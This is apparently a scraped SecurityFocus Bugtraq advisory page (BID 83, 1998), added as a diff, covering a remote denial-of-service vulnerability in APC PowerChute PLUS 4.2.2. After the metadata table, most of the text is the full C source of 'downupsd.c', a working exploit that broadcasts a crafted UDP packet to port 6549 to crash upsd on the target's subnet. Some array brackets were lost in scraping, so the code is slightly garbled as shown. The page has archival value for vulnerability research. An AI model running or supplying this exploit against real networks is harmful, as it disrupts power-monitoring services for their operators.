@@ -1,0 +1,95 @@
+#bid83<p><b><span style="font-size: 18pt;">PowerChute PLUS Denial of Service Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/83/info">info</a><br><a href="http://www.securityfocus.com/bid/83/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/83/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/83/solution">solution</a><br><a href="http://www.securityfocus.com/bid/83/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				83
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 10 1998 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 10 1998 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was published as "APC UPS PowerChute PLUS exploit..." by Theo Schlossnagle &lt;jesus@blaze.cs.jhu.edu&gt; to the BugTraq mailing list on April 10, 1998.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					APC PowerChute Plus 4.2.2 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	----- begin downupsd.c -----<br/>#include &lt;stdio.h&gt;<br/>#include &lt;stdlib.h&gt;<br/>#include &lt;unistd.h&gt;<br/>#include &lt;sys/types.h&gt;<br/>#include &lt;sys/socket.h&gt;<br/>#include &lt;netdb.h&gt;<br/>#include &lt;netinet/in.h&gt;<br/><br/>int main(int argc, char **argv) {<br/>int s;<br/>long on=1;<br/>size_t addrsize;<br/>char buffer256;<br/>struct sockaddr_in toaddr, fromaddr;<br/>struct hostent h_ent;<br/><br/>if(argc!=2) {<br/>  fprintf(stderr, "Usage:\n\t%s &lt;hostname running upsd&gt;\n", argv0);<br/>  exit(0);<br/>}<br/>s = socket(AF_INET,SOCK_DGRAM,0);<br/>setsockopt(s, SOL_SOCKET, SO_BROADCAST, (char *)&amp;on, sizeof(on));<br/><br/>printf("Crashing upsd on host's subnet: %s\n", argv1);<br/><br/>toaddr.sin_family = AF_INET;<br/>toaddr.sin_port = htons(0);<br/>toaddr.sin_addr.s_addr = 0x00000000;<br/>bind(s, (struct sockaddr *)&amp;toaddr, sizeof(struct sockaddr_in));<br/>toaddr.sin_port = htons(6549);<br/>memcpy((char *)&amp;h_ent, (char *)gethostbyname(argv1), sizeof(h_ent));<br/>memcpy(&amp;toaddr.sin_addr.s_addr, h_ent.h_addr, sizeof(struct in_addr));<br/>toaddr.sin_addr.s_addr |= 0xff000000;<br/>strcpy(buffer, "027|1|public|9|0|0|2010~|0\0");<br/>sendto(s, buffer, 256, 0, (struct sockaddr *)&amp;toaddr,<br/>       sizeof(struct sockaddr_in));<br/><br/>printf("Crashed...\n");<br/>close(s);<br/><br/>}<br/>------- end downupsd.c -----
+	
+		<ul>
+</ul>
+</div>
